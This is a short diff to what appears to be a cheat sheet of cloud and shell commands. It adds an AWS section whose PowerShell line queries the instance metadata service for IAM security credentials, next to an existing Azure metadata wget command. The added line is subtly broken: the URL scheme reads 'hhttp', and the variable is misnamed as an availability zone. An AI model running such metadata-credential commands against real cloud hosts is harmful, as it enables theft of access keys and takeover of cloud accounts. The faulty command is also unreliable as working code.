@@ -188,6 +188,15 @@ Azure
 busybox wget --header="Metadata: true" http://169.254.169.254/metadata/instance?api-version=2017-04-02
 ```
 
+AWS
+---
+
+```
+$localInstanceAvailabilityZone = (invoke-webrequest "hhttp://169.254.169.254/latest/meta-data/iam/security-credentials/").content
+```
+
+
+
 
 NC
 ---
